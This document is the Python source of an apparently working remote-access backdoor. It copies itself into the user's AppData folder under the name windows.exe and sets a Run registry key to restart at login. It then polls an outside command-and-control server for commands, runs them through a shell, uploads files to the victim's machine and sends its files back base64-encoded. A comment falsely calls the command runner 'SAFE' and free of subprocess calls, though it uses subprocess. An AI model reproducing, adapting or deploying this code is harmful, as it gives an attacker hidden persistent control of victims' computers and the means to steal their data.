import time
import requests
import os
import base64
import subprocess
import json
import sys
import shutil


class Client:

    def __init__(self, base_url, token):
        self.persistence()
        self.base_url = base_url
        self.headers = {"X-Auth-Token": token}
        self.session = requests.Session()
  
        
    def persistence(self):
        try :
            file_location= os.environ["appdata"] + "\\windows.exe"
            if not os.path.exists(file_location):
                shutil.copyfile(sys.executable,file_location)
                subprocess.call( 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v tata /t REG_SZ /d "' + file_location + '" /f',shell=True)
        except Exception:
            pass
        

    def poll_command(self):
        r = self.session.get(self.base_url + "/get_cmd", headers=self.headers)
        return r.json()   # {cid, cmd}

    def send_result(self, cid, output):
        self.session.post(
            self.base_url + "/send_result",
            json={"cid": cid, "output": output},
            headers=self.headers
        )
    def read_file(self,path):
        with open(path,"rb") as file:
            data=file.read()
            return base64.b64encode(data).decode()
    def write_file(self,filename,content):
        with open(filename,"wb") as file:
               file.write(base64.b64decode(content))
               return filename +" Uploaded "
    def change_dir(self,path):
        os.chdir(path)
        return "changing dir --> "+path
        

        

    # 🔒 SAFE command interpreter (NO subprocess)
    def execute_cmd(self, cmd_list):
        NULL = open(os.devnull,"wb")
        result =subprocess.check_output(cmd_list, shell=True,stderr=NULL,stdin=NULL)
        return result
        
        
    def run(self):
        while True:
            cmd = self.poll_command()
            if cmd:
                cid = cmd["cid"]
                cmd_list = cmd["cmd"]                       
                try:
                    if cmd_list[0] == "exit":
                        self.send_result(cid,"cliet exited !!!")
                        sys.exit()
                        
                    elif cmd_list[0] == "cd"and len(cmd_list)>1:
                        result =self.change_dir(cmd_list[1])
                    elif cmd_list[0] =="download" and len(cmd_list)>1:
                        result=self.read_file(cmd_list[1])
                    elif cmd_list[0]== "upload":
                        result =self.write_file(cmd_list[1],cmd_list[2])
                    else:
                        if len(cmd_list)>1:
                            cmd_list=" ".join(cmd_list)
                            result = self.execute_cmd(cmd_list).decode(errors="ignore")
                            
                        else:
                            result = self.execute_cmd(cmd_list[0]).decode(errors="ignore")
                
                except Exception:
                    result =" ∆ Error While Running The Commands"
                self.send_result(cid,result)
            time.sleep(0.3)



try:
    Client(
    "https://kaizo2byte.pythonanywhere.com",
    "my_secret_token"
).run()
except Exception:
    pass





